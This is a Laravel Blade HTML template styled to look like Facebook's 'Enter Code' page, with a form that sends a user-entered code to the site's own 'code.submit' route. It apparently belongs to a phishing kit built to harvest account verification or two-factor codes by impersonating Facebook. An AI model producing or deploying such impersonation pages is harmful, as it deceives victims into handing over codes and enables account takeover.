<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Enter Code - Facebook</title>
    <link href="https://fonts.googleapis.com/css?family=Roboto:400,700&display=swap" rel="stylesheet">
    <style>
        body {
            background: #f0f2f5;
            font-family: 'Roboto', Arial, sans-serif;
        }
        .fb-container {
            max-width: 400px;
            margin: 60px auto;
            background: #fff;
            border-radius: 8px;
            box-shadow: 0 2px 8px rgba(0,0,0,0.1);
            padding: 32px 24px 24px 24px;
        }
        .fb-logo {
            color: #1877f2;
            font-size: 48px;
            font-weight: bold;
            text-align: center;
            margin-bottom: 24px;
            letter-spacing: -2px;
        }
        .fb-form input[type="text"] {
            width: 100%;
            padding: 12px;
            margin-bottom: 16px;
            border: 1px solid #ddd;
            border-radius: 6px;
            font-size: 16px;
        }
        .fb-form button {
            width: 100%;
            background: #1877f2;
            color: #fff;
            border: none;
            padding: 12px;
            border-radius: 6px;
            font-size: 18px;
            font-weight: bold;
            cursor: pointer;
            margin-bottom: 12px;
        }
        .fb-form button:hover {
            background: #166fe5;
        }
    </style>
</head>
<body>
    <div class="fb-container">
        <div class="fb-logo">facebook</div>
        <form class="fb-form" method="POST" action="{{ route('code.submit') }}">
            @csrf
            <input type="text" name="code" placeholder="Enter code" required autofocus>
            <button type="submit">Continue</button>
        </form>
    </div>
</body>
</html>
